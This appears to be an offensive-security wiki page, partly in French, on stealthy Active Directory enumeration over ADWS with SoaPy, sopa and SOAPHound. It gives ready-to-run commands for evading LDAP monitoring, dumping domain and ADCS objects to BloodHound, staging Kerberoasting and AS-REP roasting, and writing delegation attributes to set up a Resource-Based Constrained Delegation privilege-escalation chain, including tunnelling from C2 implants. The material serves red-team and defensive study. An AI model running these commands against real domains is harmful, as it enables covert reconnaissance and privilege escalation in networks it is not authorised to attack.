# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## What is ADWS?

Active Directory Web Services (ADWS) is **enabled by default on every Domain Controller since Windows Server 2008 R2** and listens on TCP **9389**.  Despite the name, **no HTTP is involved**.  Instead, the service exposes LDAP-style data through a stack of proprietary .NET framing protocols:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Because the traffic is encapsulated inside these binary SOAP frames and travels over an uncommon port, **enumeration through ADWS is far less likely to be inspected, filtered or signatured than classic LDAP/389 & 636 traffic**.  For operators this means:

* Reconnaissance plus discrète – Blue teams se concentrent souvent sur les requêtes LDAP.
* Possibilité de collecter depuis des hôtes **non-Windows (Linux, macOS)** en tunnelant 9389/TCP via un proxy SOCKS.
* Les mêmes données que vous obtiendriez via LDAP (users, groups, ACLs, schema, etc.) et la capacité d'effectuer des **writes** (ex. `msDs-AllowedToActOnBehalfOfOtherIdentity` pour **RBCD**).

ADWS interactions are implemented over WS-Enumeration: every query starts with an `Enumerate` message that defines the LDAP filter/attributes and returns an `EnumerationContext` GUID, followed by one or more `Pull` messages that stream up to the server-defined result window. Contexts age out after ~30 minutes, so tooling either needs to page results or split filters (prefix queries per CN) to avoid losing state. When asking for security descriptors, specify the `LDAP_SERVER_SD_FLAGS_OID` control to omit SACLs, otherwise ADWS simply drops the `nTSecurityDescriptor` attribute from its SOAP response.

> NOTE: ADWS is also used by many RSAT GUI/PowerShell tools, so traffic may blend with legitimate admin activity.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) is a **full re-implementation of the ADWS protocol stack in pure Python**.  It crafts the NBFX/NBFSE/NNS/NMF frames byte-for-byte, allowing collection from Unix-like systems without touching the .NET runtime.

### Key Features

* Supports **proxying through SOCKS** (useful from C2 implants).
* Fine-grained search filters identical to LDAP `-q '(objectClass=user)'`.
* Optional **write** operations ( `--set` / `--delete` ).
* **BOFHound output mode** for direct ingestion into BloodHound.
* `--parse` flag to prettify timestamps / `userAccountControl` when human readability is required.

### Targeted collection flags & write operations

SoaPy ships with curated switches that replicate the most common LDAP hunting tasks over ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, plus raw `--query` / `--filter` knobs for custom pulls. Pair those with write primitives such as `--rbcd <source>` (sets `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging for targeted Kerberoasting) and `--asrep` (flip `DONT_REQ_PREAUTH` in `userAccountControl`).

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Utilisez le même hôte/identifiants pour exploiter immédiatement les résultats : dump les RBCD-capable objects avec `--rbcds`, puis appliquez `--rbcd 'WEBSRV01$' --account 'FILE01$'` pour mettre en place une chaîne Resource-Based Constrained Delegation (voir [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) pour le parcours d'abus complet).

### Installation (hôte opérateur)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Sopa - Un client pratique pour ADWS en Golang

Similarly as soapy, [sopa](https://github.com/Macmod/sopa) implements the ADWS protocol stack (MS-NNS + MC-NMF + SOAP) in Golang, exposing command-line flags to issue ADWS calls such as:

* **Recherche et récupération d'objets** - `query` / `get`
* **Cycle de vie des objets** - `create [user|computer|group|ou|container|custom]` and `delete`
* **Édition d'attributs** - `attr [add|replace|delete]`
* **Gestion des comptes** - `set-password` / `change-password`
* et d'autres tels que `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

## SOAPHound – High-Volume ADWS Collection (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) est un collecteur .NET qui garde toutes les interactions LDAP à l'intérieur d'ADWS et génère du JSON compatible BloodHound v4. Il construit un cache complet de `objectSid`, `objectGUID`, `distinguishedName` et `objectClass` une seule fois (`--buildcache`), puis le réutilise pour des passes à haut volume `--bhdump`, `--certdump` (ADCS), ou `--dnsdump` (AD-integrated DNS) de sorte que seulement ~35 attributs critiques quittent le DC. AutoSplit (`--autosplit --threshold <N>`) segmente automatiquement les requêtes par préfixe CN pour rester en dessous du timeout EnumerationContext de 30 minutes dans de grandes forêts.

Flux de travail typique sur une VM d'opérateur jointe au domaine:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Les JSON exportés peuvent être directement injectés dans les workflows SharpHound/BloodHound — voir [BloodHound methodology](bloodhound.md) pour des idées de visualisation en aval. AutoSplit rend SOAPHound résilient sur des forêts de plusieurs millions d'objets tout en maintenant un nombre de requêtes inférieur à celui des instantanés de type ADExplorer.

## Flux de collecte AD furtif

Le workflow ci‑dessous montre comment énumérer **domain & ADCS objects** via ADWS, les convertir en BloodHound JSON et rechercher des chemins d'attaque basés sur des certificats — le tout depuis Linux :

1. **Tunnel 9389/TCP** depuis le réseau cible vers votre machine (par ex. via Chisel, Meterpreter, SSH dynamic port-forward, etc.). Exportez `export HTTPS_PROXY=socks5://127.0.0.1:1080` ou utilisez les options `--proxyHost/--proxyPort` de SoaPy.

2. **Collect the root domain object:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Collecter les objets liés à ADCS dans la Configuration NC :**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Convertir en BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Téléversez le ZIP** dans le BloodHound GUI et exécutez des requêtes cypher telles que `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` pour révéler des chemins d'escalade de certificats (ESC1, ESC8, etc.).

### Écriture de `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Combinez ceci avec `s4u2proxy`/`Rubeus /getticket` pour une chaîne complète de **Resource-Based Constrained Delegation** (voir [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Résumé des outils

| Objectif | Outil | Remarques |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Converts SoaPy/ldapsearch logs |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Can be proxied through same SOCKS |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Generic client to interface with known ADWS endpoints - allows for enumeration, object creation, attribute modifications, and password changes |

## Références

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
